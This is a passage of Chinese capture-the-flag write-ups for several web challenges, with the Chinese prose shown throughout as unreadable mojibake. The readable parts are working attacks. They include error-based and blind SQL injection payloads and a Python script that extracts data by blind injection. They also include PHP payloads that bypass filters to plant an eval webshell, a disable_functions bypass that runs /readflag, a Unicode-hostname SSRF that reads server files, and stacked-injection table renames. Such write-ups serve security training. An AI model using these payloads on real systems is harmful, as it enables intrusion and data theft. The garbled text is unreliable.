è¿™é‡Œç”¨åˆ°äº†likeï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™é‡ŒæŸ¥åˆ—å /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))),0x7e),1) æ‹¿flagï¼Œç”±äºupdtexmlæœ€å¤šæ˜¾ç¤º32ä¸ªå­—ç¬¦çš„é•¿åº¦ï¼Œå¯¼è‡´flagæ˜¾ç¤ºä¸å…¨ã€‚å¯ä»¥ç”¨substræˆªå–ï¼Œä½†æ˜¯å‘ç°substrè¢«è¿‡æ»¤äº†ï¼Œç„¶åå‚è€ƒç½‘ä¸Šå­¦åˆ°äº†ç”¨leftå’Œrightæˆªå–å‡½æ•°åˆ†ä¸¤æ¬¡æŠŠå®Œæ•´çš„flagæŸ¥å‡ºæ¥äº†ã€‚ /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1)%23/check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1)%23 [æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQLè€ƒå¯Ÿå¸ƒå°”ç›²æ³¨ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®å‘ç°å¤šäº†äº”ä¸ªæŒ‰é’®ï¼Œå¹¶ä¸”æç¤ºä¸­æœ‰SQLç›²æ³¨çš„å­—æ ·ï¼ŒçŒœæµ‹å°±æ˜¯è€ƒå®ƒçš„äº†ã€‚è¿™é‡Œå¯ä»¥çš„åœ°æ–¹å°±æ˜¯äº”ä¸ªæŒ‰é’®äº†ï¼Œç‚¹å‡»ä¹‹åå‘ç°æ—¶ç”¨diä¼ å‚ï¼Œæ³¨å…¥ç‚¹å¤šåŠåœ¨è¿™é‡Œã€‚ç”±äºè¿™é‡Œä¼ çš„å€¼æ˜¯1-5ï¼ŒçŒœæµ‹æ˜¯å¸ƒå°”ç›²æ³¨ï¼Œä¾¿ç”¨å¸¸ç”¨çš„å§¿åŠ¿æµ‹è¯•ä¸€ä¸‹ï¼šæ„é€ id=1^1å’Œid=1^0å‘ç°å›æ˜¾ä¸åŒï¼Œå‰è€…è¿”å›ERROR!!!(æ³¨æ„è¿™é‡Œçš„è¿”å›è·Ÿå…¶ä»–é”™è¯¯ä¸ä¸€æ ·ï¼Œå…¶ä»–é”™è¯¯å›æ˜¾æ˜¯ERROR!)åè€…æ˜¯id=1çš„é¡µé¢ï¼Œè¯´æ˜äº†å°±æ˜¯å¸ƒå°”ç›²æ³¨ã€‚å…³äºå¸ƒå°”ç›²æ³¨å¯ä»¥å‚è€ƒè¿™é‡Œè¿™é‡Œéœ€è¦ç”¨åˆ°çš„å‡½æ•°å¦‚ä¸‹ï¼š Lengthï¼ˆï¼‰å‡½æ•° è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦Substrï¼ˆï¼‰æˆªå–å­—ç¬¦ä¸²Asciiï¼ˆï¼‰è¿”å›å­—ç¬¦çš„asciiç sleep(n)ï¼šå°†ç¨‹åºæŒ‚èµ·ä¸€æ®µæ—¶é—´ nä¸ºnç§’if(expr1,expr2,expr3):åˆ¤æ–­è¯­å¥ å¦‚æœç¬¬ä¸€ä¸ªè¯­å¥æ­£ç¡®å°±æ‰§è¡Œç¬¬äºŒä¸ªè¯­å¥å¦‚æœé”™è¯¯æ‰§è¡Œç¬¬ä¸‰ä¸ªè¯­å¥ é‚£ä¹ˆæ„é€ ç±»ä¼¼id=1^(length(database())&gt;10)^1çš„è¯­å¥ï¼Œä¾¿å¯ä»¥çˆ†ç ´å‡ºæ•°æ®åº“åçš„é•¿åº¦ï¼Œç„¶åå†åˆ©ç”¨id=1^(ascii(substr((select(database())),1,1))&gt;100)^1payloadæ¥çˆ†ç ´å‡ºæ•°æ®åº“åï¼ŒåŒç†å¯ä»¥çˆ†ç ´å‡ºè¡¨åå’Œæœ€åçš„flagã€‚å¸ƒå°”ç›²æ³¨ä¸€èˆ¬éƒ½å€ŸåŠ©pythonè„šæœ¬æ¥è§£ï¼Œå¤§è‡´çš„ä»£ç é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œè´´å‡ºåˆ©ç”¨äºŒåˆ†çˆ†ç ´çš„è„šæœ¬ï¼Œæ•ˆç‡æ¯”è¾ƒé«˜ï¼š import reimport requestsimport string url = \"http://127.0.0.1/search.php\"flag = ''def payload(i,j): # sql = \"1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1\"%(i,j) #æ•°æ®åº“åå­— # sql = \"1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1\"%(i,j) #è¡¨å # sql = \"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1\"%(i,j) #åˆ—å sql = \"1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1\"%(i,j) data = {\"id\":sql} r = requests.get(url,params=data) # print (r.url) if \"Click\" in r.text: res = 1 else: res = 0 return res def exp(): global flag for i in range(1,10000) : print(i,':') low = 31 high = 127 while low &lt;= high : mid = (low + high) // 2 res = payload(i,mid) if res : low = mid + 1 else : high = mid - 1 f = int((low + high + 1)) // 2 if (f == 127 or f == 31): break # print (f) flag += chr(f) print(flag) exp()print('flag=',flag) è¿™ä¸ªé¢˜æ¯”è¾ƒå‘çš„å°±æ˜¯è¦è¯»çš„å†…å®¹å¾ˆå¤šï¼Œflagä¹Ÿåœ¨åé¢ï¼ŒåŠ ä¸ŠæœåŠ¡å™¨æ€§èƒ½å’Œç½‘ç»œæ€§èƒ½çš„åŸå› ä¸€ç›´è¯»ä¸å…¨å†…å®¹ï¼Œåæ¥å¤šæ¬¡æµ‹è¯•ï¼Œflagå¤§æ¦‚åœ¨ç¬¬170ä¸ªå­—ç¬¦åé¢ï¼Œå°†içš„èµ·å§‹å¤§å°æ”¹ä¸€ä¸‹å°±è¡Œäº†ã€‚è„šæœ¬ä¹Ÿå¯ä»¥ç”¨äºå…¶ä»–å¸ƒå°”ç›²æ³¨çš„é¢˜ç›®ï¼Œæ ¹æ®é¢˜ç›®ç‰¹ç‚¹æ›´æ”¹å³å¯ã€‚ [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE MEè€ƒå¯Ÿåˆ©ç”¨PHP 7å‡½æ•°è§£æç‰¹æ€§ç»•è¿‡æ­£åˆ™å·§å–webshellã€åˆ©ç”¨ç¯å¢ƒå˜é‡ç»•è¿‡functions_disableã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ç»™å‡ºå¦‚ä¸‹æºç ï¼š &lt;?phperror_reporting(0);if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)&gt;40){ die(\"This is too Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code);}else{ highlight_file(__FILE__);}// ?&gt; å¯ä»¥çœ‹åˆ°ï¼Œéœ€è¦ç»•è¿‡é•¿åº¦åˆ¤æ–­å’Œæ­£åˆ™ï¼Œå¹¶ä¸”è¿™ä¸ªæ­£åˆ™æŠŠæ‰€æœ‰å­—æ¯å’Œæ•°å­—éƒ½åœ¨å…¶ä¸­ã€‚æŸ¥èµ„æ–™å¾—çŸ¥å¯ä»¥åˆ©ç”¨PHP 7çš„è§£æç‰¹æ€§æ¥ç»•è¿‡ã€‚ è¿™å°±è¯´æ˜ï¼š phpinfo() #php5ã€php7å¯æ‰§è¡Œ(phpinfo)() #php7å¯æ‰§è¡Œ å¦å¤–ï¼Œä¹‹å‰åˆ·é¢˜çš„ä¸€ç¯‡åšå®¢å†™åˆ°è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å–å~æ¥ç»•è¿‡å¯¹å­—ç¬¦çš„è¿‡æ»¤ã€‚åœ¨php7çš„ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¼–ç è½¬æ¢ç­‰å½¢å¼ï¼Œå°†phpinfoè½¬æ¢æˆä¸€äº›ä¸å¯è§å­—ç¬¦å†ä¼ å…¥åˆ°é¢˜ç›®ä¸­ï¼Œè¿™æ ·ä¸ä»…ç»•è¿‡äº†æ­£åˆ™çš„åŒ¹é…ï¼Œä¹ŸæˆåŠŸçš„æ‰§è¡Œäº†å‡½æ•°ï¼Œè¿™é‡Œè¿›è¡Œç¼–ç è½¬æ¢çš„æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œå¸¸ç”¨çš„æœ‰åˆ©ç”¨^å’Œ~ ç”Ÿæˆçš„ä¸å¯è§å­—ç¬¦ï¼Œè¿™é‡Œæ›´å€¾å‘äºä½¿ç”¨~æ±‚åè¿ç®—ç¬¦ã€‚ å¯ä»¥åˆ©ç”¨å¦‚ä¸‹ä»£ç ç”Ÿæˆpayloadï¼š &lt;?php $shell = phpinfo; echo urlencode(~$shell);?&gt;%8F%97%8F%96%91%99%90 æ•ˆæœå¦‚ä¸‹ï¼š åŒæ—¶ä¹Ÿå¯ä»¥çœ‹åˆ°ç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œè€Œassertä¸å†å…¶ä¸­ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨å®ƒæ¥æ‹¿åˆ°shellï¼Œå…ˆæ”¾ç€ã€‚ ä¸‹ä¸€æ­¥åˆ©ç”¨phpçš„å‡½æ•°çœ‹ä¸€ä¸‹ç›®å½•ï¼š print_r(scandir('./')); ç¼–ç ä¹‹åä¸ºï¼š %8F%8D%96%91%8B%A0%8D # print_r%8C%9C%9E%91%9B%96%8D # scandir æ„é€ å¦‚ä¸‹payloadè¯»å–å½“å‰ç›®å½•å†…å®¹ï¼š code=(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((&quot;./&quot;))); æ ¹ç›®å½•å‘¢ï¼Ÿ ç›´æ¥ç”¨readfile()è¯»å–flagæ–‡ä»¶æ˜¯è¯»ä¸åˆ°çš„ï¼Œå› ä¸ºæ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±éœ€è¦æ‹¿åˆ°shellæ‰§è¡Œreadflagæ¥æ‹¿åˆ°flagäº†ã€‚ è€Œè¿™é¢˜æ‹¿åˆ°shellå¯ä»¥åˆ©ç”¨å‰é¢æåˆ°çš„ç¼–ç æ¥è·å–ï¼Œä¹Ÿå¯ä»¥ç”¨ä¹‹å‰è®²è¿‡çš„åˆ©ç”¨éƒ¨åˆ†æ±‰å­—å¼‚æˆ–æ¥æ„é€ POSTæˆ–GETä¼ å‚æ¥æ‹¿åˆ°shellï¼Œç„¶åéœ€è¦bypass functions_disableäº†ã€‚ è§£é¢˜åˆ©ç”¨å¦‚ä¸‹payloadæ‹¿åˆ°shellï¼š code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27]) ç„¶åèšå‰‘è¿ä¸Šï¼Œæ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨ç¯å¢ƒå˜é‡bypassäº†ï¼Œæœ€è¿‘åœ¨ä¸æ–­æ”¶é›†bypassçš„expï¼Œä»Šå¤©åˆæ‰¾åˆ°ä¸€ä¸ªã€‚ æˆ‘ä»¬æŠŠexpä¸­çš„bypass_disablefunc_x64.soå’Œbypass_disablefunc.phpå†™å…¥åˆ°/var/tmpè·¯å¾„ä¸‹ï¼Œç„¶ååˆ©ç”¨å¦‚ä¸‹payloadè®¿é—®ï¼š code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/result&amp;sopath=/var/tmp/bypass_disablefunc_x64.so","link":"/2020/02/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"},{"title":"BUUCTF-webåˆ·é¢˜â…¡","text":"åˆ·é¢˜åˆ·ä¸åœï¼Œç»§ç»­åˆ·ï¼ğŸ‘¾ğŸ‘¾ğŸ‘¾ [SUCTF 2019]Pythonginxè€ƒå¯ŸçŸ¥è¯†è€ƒå¯ŸBlack Hat2019çš„ä¸€ä¸ªè®®é¢˜ï¼šåœ¨unicodeä¸­å­—ç¬¦â„€(U+2100)ï¼Œå½“åˆ©ç”¨IDNAå¤„ç†æ­¤å­—ç¬¦æ—¶ï¼Œä¼šå°†â„€å˜æˆa/cï¼Œå› æ­¤å½“ä½ è®¿é—®æ­¤urlæ—¶ï¼ŒdnsæœåŠ¡å™¨ä¼šè‡ªåŠ¨å°†urlé‡å®šå‘åˆ°å¦ä¸€ä¸ªç½‘ç«™ã€‚å¦‚æœæœåŠ¡å™¨å¼•ç”¨å‰ç«¯urlæ—¶ï¼Œåªå¯¹åŸŸååšäº†é™åˆ¶ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ¾ç»•è¿‡æœåŠ¡å™¨å¯¹åŸŸåçš„é™åˆ¶ã€‚å…³äºINDAå’ŒUIF-8çš„æ¼æ´ï¼šhttps://www.cnblogs.com/cimuhuashuimu/p/11490431.htmlæ­¤ç±»çš„å­—ç¬¦è¿˜æœ‰ï¼š U+2100, â„€U+2101, â„U+2105, â„…U+2106, â„†U+FF0F, ï¼U+2047, â‡U+2048, âˆU+2049, â‰U+FE16,ï¸–U+FE56, ï¹–U+FF1F, ï¼ŸU+FE5F, ï¹ŸU+FF03, ï¼ƒU+FE6B, ï¹«U+FF20, ï¼ ç›¸ä¿¡æ€»ä¼šç”¨åˆ°çš„ å‚è€ƒBlack Hat2019çš„PPTï¼šhttps://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œç»™äº†å¦‚ä¸‹çš„æºç  from flask import Flask, Blueprint, request, Response, escape ,render_templatefrom urllib.parse import urlsplit, urlunsplit, unquotefrom urllib import parseimport urllib.requestapp = Flask(__name__)# Index@app.route('/', methods=['GET'])def app_index(): return render_template('index.html')@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"æˆ‘æ‰Œ your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"æˆ‘æ‰Œ your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #å»æ‰ url ä¸­çš„ç©ºæ ¼ finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"æˆ‘æ‰Œ your problem? 333\"if __name__ == \"__main__\": app.run(host='0.0.0.0', port=80) æˆ‘ä»¬çœ‹åˆ°getUrl()ä¼šå¯¹ä¼ å…¥çš„urlåšå¤šå±‚å¤„ç†å’Œè¿‡æ»¤ï¼šç¬¬ä¸€å±‚å¤„ç†åŠè¿‡æ»¤ï¼š host = parse.urlparse(url).hostnameif host == 'suctf.cc': return \"æˆ‘æ‰Œ your problem? 111\" è¿™é‡Œhost = parse.urlparse(url).hostnameè¿”å›ä¼ å…¥çš„urlçš„ä¸»æœºåï¼Œè¿™é‡Œurlparseæ˜¯å°†urlå­—ç¬¦ä¸²æ‹†åˆ†ä¸ºç»„ä»¶ï¼Œå¯å‚è€ƒï¼šhttps://www.cnblogs.com/jiumo/p/11143741.htmlåœ¨æœ¬æœºæµ‹è¯•æ•ˆæœå¦‚ä¸‹ï¼š &gt;&gt;&gt; from urllib.parse import urlparse&gt;&gt;&gt; urlparse('http://www.baidu.com/index.php')ParseResult(scheme='http', netloc='www.baidu.com', path='/index.php', params='', query='', fragment='')&gt;&gt;&gt; urlparse('http://www.baidu.com/index.php').hostname'www.baidu.com' è¿™é‡Œä¸ä¼šå¯¹urlä¸­çš„ç±»ä¼¼äºâ„€çš„å­—ç¬¦åšå¤„ç†ï¼Œæµ‹è¯•æ•ˆæœï¼š &gt;&gt;&gt; urlparse('http://www.baidu.â„€om/index.php').hostname'www.baidu.â„€om' å› æ­¤å€ŸåŠ©INDAæ¼æ´æ„é€ çš„urlå¯ä»¥é€šè¿‡è¿™ä¸€æ­¥çš„è¿‡æ»¤ã€‚ç¬¬äºŒå±‚å¤„ç†åŠè¿‡æ»¤ï¼š parts = list(urlsplit(url))host = parts[1]if host == 'suctf.cc': return \"æˆ‘æ‰Œ your problem? 222 \" + host urlsplitæ˜¯å°†urlè¿›è¡Œåˆ†å‰²ï¼Œæµ‹è¯•ï¼š &gt;&gt;&gt; from urllib.parse import urlsplit&gt;&gt;&gt; urlsplit('http://www.baidu.com/index.php')SplitResult(scheme='http', netloc='www.baidu.com', path='/index.php', query='', fragment='')&gt;&gt;&gt; urlsplit('http://www.baidu.com/index.php')[1]'www.baidu.com' æ­¤å¤„åˆ©ç”¨äº†ä¸€ä¸ªCVEï¼šurlsplitä¸å¤„ç† NFKC æ ‡å‡†åŒ–(ç”¨ Punycode/IDNAç¼–ç çš„URLä½¿ç”¨NFKCè§„èŒƒåŒ–æ¥åˆ†è§£å­—ç¬¦)ï¼Œå› æ­¤å¯¹â„€ç±»çš„å­—ç¬¦ä¹Ÿæ˜¯å¤„ç†ä¸äº†çš„ï¼š &gt;&gt;&gt; urlsplit('http://www.baidu.â„€om/index.php')[1]'www.baidu.â„€om' ç»•è¿‡å‰ä¸¤å±‚è¿‡æ»¤ï¼Œåˆ°ç¬¬ä¸‰å±‚å¤„ç†ï¼š newhost = []for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8'))parts[1] = '.'.join(newhost) æˆ‘ä»¬å‘ç°ï¼Œè¿™é‡Œæ˜¯åœ¨urlçš„.å¤„è¿›è¡Œåˆ†å‰²ï¼Œå¹¶åŠ å…¥åˆ°newhost[]æ•°ç»„ä¸­ï¼Œä½†æ˜¯åŠ å…¥æ•°ç»„ä¹‹å‰ä¼šç»§ç»­INDAç¼–ç ç„¶åUTF-8è§£ç ï¼Œé‚£ä¹ˆåœ¨æ­¤å¤„â„€ç±»çš„å­—ç¬¦ä¾¿ä¼šè¢«è§£æä¸ºa/cï¼Œæˆ‘ä»¬åˆ©ç”¨æ­¤æ¼æ´ä¾¿å¯ä»¥æ„é€ èƒ½æ‰“å…¥æœåŠ¡å™¨æ‹¿flagçš„payloadäº†ã€‚ è§£é¢˜æˆ‘ä»¬ä»å‰é¢çš„ä»£ç çœ‹åˆ°ï¼Œæ„é€ çš„urlçš„åŸŸåéœ€è¦ç»•è¿‡å‰ä¸¤å±‚host == 'suctf.cc'çš„åˆ¤æ–­ï¼Œå¹¶ä¸”è¦æ»¡è¶³ç¬¬ä¸‰å±‚çš„host == 'suctf.cc'ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥æ„é€ åŸŸåï¼šsuctf.câ„†srä¾¿å¯ä»¥ç»•è¿‡å¯¹åŸŸåçš„åˆ¤æ–­ã€‚ä½†æ˜¯ç°åœ¨æˆ‘ä»¬ä¸çŸ¥é“flagæ–‡ä»¶åœ¨å“ªï¼Œä½†æ˜¯é¢˜ç›®ç»™äº†æç¤ºï¼š &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;&lt;!-- Do you know the nginx? --&gt; æç¤ºæˆ‘ä»¬æ˜¯åŸºäºnginxæ¶æ„çš„æœåŠ¡å™¨ï¼Œé‚£è‚¯å®šä¸å…¶é…ç½®æ–‡ä»¶ç›¸å…³è¿™é‡Œè¡¥å……çŸ¥è¯†ï¼š Nginxé‡è¦æ–‡ä»¶ä½ç½®:é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginxä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.confç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.serviceæ¨¡å—ï¼š/usr/lisb64/nginx/modulesåº”ç”¨ç¨‹åºï¼š/usr/sbin/nginxç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/htmlæ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginxé…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf æˆ‘ä»¬è¯»å–nignx.confåº”è¯¥èƒ½æ‰¾åˆ°flagæ–‡ä»¶çš„ä½ç½®ï¼Œæ„é€ payloadï¼š file://suctf.câ„†sr/local/nginx/conf/nginx.conf åˆ©ç”¨fileåè®®è¯»å–nginx.confå†…å®¹å¦‚ä¸‹ï¼š server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } } æ‹¿åˆ°flagæ–‡ä»¶çš„ä½ç½®ä¹‹åï¼Œæ„é€ æœ€ç»ˆpayloadï¼š /getUrl?url=file://suctf.c%E2%84%86sr/fffffflag è¿™é‡Œæ³¨æ„â„†éœ€è¦è¿›è¡Œurlç¼–ç ã€‚ æ‹“å±•ä¸€ä¸‹ï¼špythonçš„urlsplitå‡½æ•°å…¶å®æ˜¯æ¯”è¾ƒä¸å®Œå–„çš„ï¼Œè¿˜å­˜åœ¨urlsplit NFKD æ ‡å‡†åŒ–æ¼æ´ï¼Œä»¥åé‡åˆ°çš„æ—¶å€™éœ€è¦å¤šåŠ æ³¨æ„ã€‚ [æå®¢å¤§æŒ‘æˆ˜ 2019]Httpè€ƒå¯Ÿhttpåè®®çš„é¢˜ç›®ï¼Œå¸¸è§ä¹Ÿç®€å•ã€‚ è§£é¢˜æŸ¥çœ‹æºç å‘ç°ä¸€ä¸ªSecret.phpçš„é“¾æ¥ï¼Œè¿›å»ä¹‹åæç¤ºï¼šä¼ªé€ Referå¤´å³å¯ï¼Œä¼ªé€ ä¹‹ååˆæç¤ºï¼šä¼ªé€ UAå¤´å³å¯ï¼Œç„¶åæç¤ºéœ€è¦æ¥è‡ªæœ¬åœ°ï¼šä¼ªé€ IPå³å¯æ‹¿åˆ°flagè¿™ä¸ªåœ°æ–¹å¯ä»¥ä¼ªé€ å¤šå¤„ï¼Œå¯ä»¥ä¼ªé€ x-forwarded-forä¹Ÿå¯ä»¥ä¼ªé€ client-ipï¼Œè¿˜å¯ä»¥ä¼ªé€ hostå¤´ï¼Œæœ‰äº›æ—¶å€™ç”šè‡³æŠŠä¸‰ä¸ªéƒ½ä¼ªé€ ä¸Šï¼Œä¹‹å‰æ‰“æ¯”èµ›é‡åˆ°ä¸€ä¸ªé¢˜ç›®å°±æ˜¯ï¼Œå·¨å‘â€¦ ä¼ªé€ åè®®å¤´å¯ä»¥é€šè¿‡BPæŠ“åŒ…æ”¹åŒ…ï¼Œå½“ç„¶æœ‰æ›´æ–¹ä¾¿çš„æ–¹æ³•ï¼Œè¿™é‡Œæ¨èä¸€ä¸ªç«ç‹/è°·æ­Œçš„æ’ä»¶Header Editoræ–¹ä¾¿å¥½ç”¨ã€‚ [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨è€ƒå¯Ÿå †å æ³¨å…¥æ³¨å…¥åŸç†ï¼šåœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿç­”æ¡ˆæ˜¯ä¼šçš„ï¼Œè¿™ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´åŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ï¼š ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæç¤ºæ¡†ï¼Œè¿›è¡Œæ³¨å…¥æµ‹è¯•ï¼Œ1'çš„æ—¶å€™ä¸å›æ˜¾ï¼Œ1'#åˆ™å›æ˜¾ï¼Œè¯´æ˜å­˜åœ¨sqlæ³¨å…¥ï¼Œorder byè¯­å¥å¾—çŸ¥æœ‰ä¸¤ä¸ªå­—æ®µï¼Œä½†æ˜¯ç”¨union selectç»„åˆæŸ¥è¯¢çš„æ—¶å€™æç¤ºäº†è¿‡æ»¤çš„æƒ…å†µï¼šå¯ä»¥çœ‹åˆ°ï¼Œå¸¸ç”¨çš„æ³¨å…¥è¯­å¥åŸºæœ¬å…¨è¢«è¿‡æ»¤äº†ï¼Œç½‘ä¸Šå‚è€ƒå¾—çŸ¥æ˜¯å †å æ³¨å…¥ã€‚ è§£é¢˜åˆ©ç”¨å †å æ³¨å…¥è¿›è¡Œæ³¨å…¥ï¼š çˆ†åº“ï¼š1';show databases;#çˆ†è¡¨ï¼š1';show tables# æŸ¥è¡¨å›æ˜¾çš„ç»“æœå¦‚ä¸‹ï¼šã€‚æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªwordsè¡¨å’Œä¸€ä¸ª1919810931114514è¡¨ï¼Œflagåº”è¯¥åœ¨1919810931114514ä¸­æ²¡é”™äº†ï¼Œçœ‹ä¸€ä¸‹ï¼š 1';show columns from `1919810931114514` //æ³¨æ„ä»¥çº¯æ•°å­—ä½œä¸ºè¡¨åï¼ŒæŸ¥è¡¨çš„æ—¶å€™éœ€è¦ç”¨åå¼•å· ç°åœ¨ï¼Œæˆ‘ä»¬çŸ¥é“flagåœ¨1919810931114514è¡¨äº†ï¼Œä½†æ˜¯ç”¨å»æŸ¥è¯¢çš„å­—æ®µéƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥éœ€è¦ç”¨å…¶ä»–çš„æ–¹æ³•æ¥è·å–flagã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¾“å…¥1æˆ–è€…2çš„æ—¶å€™ï¼Œéƒ½ä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤çŒœæµ‹å†…éƒ¨æŸ¥è¯¢è¯­å¥åº”è¯¥æ˜¯é»˜è®¤åŒ¹é…wordsåº“çš„ï¼ŒæŸ¥è¯¢è¯­å¥ä¹Ÿå°±ç±»ä¼¼äºselect id, data from words where id =ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠ1919810931114514è¡¨æ”¹åä¸ºwordsè¡¨ï¼Œå¹¶ä¸”åŠ å…¥idåˆ—ï¼ŒåŒæ—¶å°†flagåˆ—æ”¹ä¸ºdataåˆ—ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œæˆ‘ä»¬æŸ¥è¯¢1' or 1=1#å°±èƒ½æ‹¿åˆ°flagäº†ã€‚æœ€ç»ˆæ„é€ payloadï¼š 1â€™;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# ç„¶å1' or 1=1å³å¯æ‹¿åˆ°flagã€‚ [SUCTF 2019]EasySQLä¹Ÿæ˜¯è€ƒå¯Ÿå †å æ³¨å…¥ï¼Œä½†æ˜¯ä¸ä¸Šé¢˜ä¸åŒï¼Œæœ¬é¢˜çªç ´ç‚¹åœ¨äºï¼šmysqlä¸­é€šè¿‡set sql_mode=PIPES_AS_CONCATå¯ä»¥å°†||è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œåˆ©ç”¨è¯­å¥å †å è®¾ç½®è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œç„¶åå†é€šè¿‡||æ‹¼æ¥æŸ¥è¯¢flagå³å¯ã€‚ 